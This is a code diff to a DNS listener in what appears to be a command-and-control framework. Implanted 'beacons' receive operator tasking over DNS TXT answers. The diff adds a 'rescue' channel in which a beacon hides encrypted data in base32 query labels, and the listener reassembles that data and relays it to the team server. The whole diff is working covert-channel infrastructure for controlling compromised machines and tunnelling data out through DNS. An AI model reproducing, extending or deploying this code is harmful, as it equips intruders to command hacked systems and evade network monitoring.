@@ -1,11 +1,18 @@
 """An authoritative-looking DNS listener for the beacon's TXT channel.
 
-This is the one transport that carries nothing upstream. The beacon sends
-a bare TXT query for `<base32(agent_id)>.b.<zone>` and decrypts whatever
-comes back; there is no payload in the question, no registration over DNS
-and no `_send_result_dns` in the client. So this listener cannot relay a
-request -- there is none -- and it cannot encrypt an answer, because it
-holds no key.
+This transport carries nothing upstream, with one exception. The ordinary
+query is a bare TXT question for `<base32(agent_id)>.b.<zone>`: no payload
+in the question, no registration over DNS and no `_send_result_dns` in the
+client, so for tasking this listener has nothing to relay and asks the
+team server instead.
+
+The exception is the rescue. A beacon whose HTTPS, SMB and QUIC legs have
+all failed has no upstream at all, and until this existed it could be
+tasked forever while never saying why it was stuck. Such a beacon sends
+`<p1>.<p2>.<base32(agent_id)>.r.<zone>`, whose two leading labels carry an
+encrypted 14-byte record. That one goes to `relay`, exactly as the SMB and
+QUIC listeners send theirs. Either way this listener holds no key and
+decrypts nothing.
 
 Instead it asks the team server for that agent's next tasking, already
 wrapped, over `GET /api/v1/dns/<agent_id>` with a shared listener token,
@@ -16,8 +23,10 @@ Two consequences an operator has to know, and both belong in the panel and
 in docs/LISTENERS.md rather than only here:
 
   * A beacon reached only over DNS can receive commands and will never
-    report. The result block in the client tries HTTPS, then SMB, then
-    QUIC, and drops the result if none is enabled.
+    report a task's *result*. The result block in the client tries HTTPS,
+    then SMB, then QUIC, and drops the result if none is enabled. What it
+    can now report is why it is stuck -- once per exhaustion, over the
+    rescue name above.
   * A task delivered this way is fire-and-forget. It leaves the queue on
     delivery, because a task that stayed would be handed out again at
     every check-in -- forever, since nothing over DNS ever acknowledges
@@ -36,9 +45,15 @@ import threading
 import time
 from typing import List, Optional, Tuple
 
-from .relay import fetch_tasking
+from .relay import fetch_tasking, relay
 
 logger = logging.getLogger("raccoon.listeners.dns")
+
+# The marker label that tells a rescue query from a tasking one. Copied
+# from software/c2/dns_rescue.py rather than imported: a listener container
+# carries this package and nothing else, and a test in test_dns_rescue
+# compares the two.
+_RESCUE_MARKER = "r"
 
 _TYPE_TXT = 16
 _CLASS_IN = 1
@@ -163,6 +178,19 @@ class DnsListener:
             # so a resolver probing for A does not learn anything.
             return _build_answer(txn_id, question, [], self.ttl)
 
+        # The one exception to this file's opening claim. A name carrying
+        # the rescue marker has a payload in the question, which is what a
+        # beacon with no upstream left uses to say why. It goes to the same
+        # `relay` the SMB and QUIC listeners use, so this listener still
+        # holds no key and still decrypts nothing.
+        rescue = self._rescue_of(name)
+        if rescue is not None:
+            payload = relay(rescue, url=self.relay_url)
+            if not payload:
+                return _build_answer(txn_id, question, [], self.ttl)
+            return _build_answer(txn_id, question, _txt_chunks(payload),
+                                 self.ttl)
+
         agent_id = self._agent_of(name)
         if agent_id is None:
             return _build_answer(txn_id, question, [], self.ttl)
@@ -172,6 +200,33 @@ class DnsListener:
         if not payload:
             return _build_answer(txn_id, question, [], self.ttl)
         return _build_answer(txn_id, question, _txt_chunks(payload), self.ttl)
+
+    def _rescue_of(self, name: str) -> Optional[str]:
+        """Reassemble `<p1>.<p2>.<id>.r.<zone>` into the base64 payload.
+
+        `None` means "not a rescue", and every way of being malformed
+        returns it -- a wrong label count, a label that is not base32, a
+        name outside the zone. The caller then answers with no records,
+        which is what it answers for an empty queue, so this cannot be used
+        as an oracle for whether a guessed payload decrypted.
+
+        The agent id is in the name but is not read here: the server
+        recovers it from the decrypted payload, and this listener has no
+        key with which to check that the two agree.
+        """
+        name = name.strip(".").lower()
+        suffix = "." + _RESCUE_MARKER + "." + self.zone
+        if not name.endswith(suffix):
+            return None
+        head = name[:-len(suffix)].split(".")
+        if len(head) != 3:
+            return None
+        text = (head[0] + head[1]).upper()
+        padded = text + "=" * (-len(text) % 8)
+        try:
+            return base64.b64encode(base64.b32decode(padded)).decode()
+        except Exception:
+            return None
 
     def _agent_of(self, name: str) -> Optional[str]:
         """Decode `<base32-id>.b.<zone>` back to the agent id.
